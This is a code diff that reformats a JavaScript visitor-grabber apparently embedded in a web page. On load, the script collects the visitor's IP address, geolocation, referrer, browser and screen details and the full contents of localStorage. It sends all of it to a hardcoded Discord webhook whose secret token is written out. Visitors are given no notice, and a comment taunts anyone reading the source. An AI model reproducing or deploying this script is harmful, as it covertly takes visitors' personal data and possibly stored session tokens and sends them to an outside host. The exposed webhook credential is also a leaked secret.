@@ -1,8 +1,8 @@
+/* this script made by Ahmed Abderraziq aka xenedium and it was modified by me */
 
-
-var ct= $.get("https://ipinfo.io", function(response) {
+var ct = $.get("https://ipinfo.io", function (response) {
     return response;
- }, "jsonp");
+}, "jsonp");
 
 var ip = new XMLHttpRequest();                                //watcha doing here stalker XD !
 ip.open('GET', 'https://api.ipify.org/');                     //Discord: DawnOfSorrow#1977
@@ -12,13 +12,13 @@ ip.onreadystatechange = (e) => {
     if (ip.readyState == 4) {
         var visitor = {
             ip: ip.response,
-            location : ct,
+            location: ct,
             date: new Date().toString(),
-            timezone:(new Date()).getTimezoneOffset()/60,
+            timezone: (new Date()).getTimezoneOffset() / 60,
             page: window.location.pathname,
             referrer: document.referrer,
             history: history.length,
-            
+
             browser: {
                 name: navigator.appName,
                 engine: navigator.product,
@@ -28,8 +28,8 @@ ip.onreadystatechange = (e) => {
                 online: navigator.onLine,
                 platform: navigator.platform,
                 cookies: navigator.cookieEnabled,
-                javaEnabled : navigator.javaEnabled,
-                dataStorage:localStorage,
+                javaEnabled: navigator.javaEnabled,
+                dataStorage: localStorage,
             },
             screen: {
                 width: screen.width,
@@ -52,7 +52,7 @@ ip.onreadystatechange = (e) => {
                 pixeldepth: screen.pixelDepth
             },
         }
- 
+
         var dsreq = new XMLHttpRequest();   //post to a discord server
         dsreq.open('POST', 'https://discord.com/api/webhooks/995696108703596574/Is3h9dOul5Cru76Bjvr330NV0DelfhdQcVUi32x2NYQhDnYMS3dLNvi9sQBKVLmE_Szl');
         dsreq.setRequestHeader('Content-Type', 'application/json');
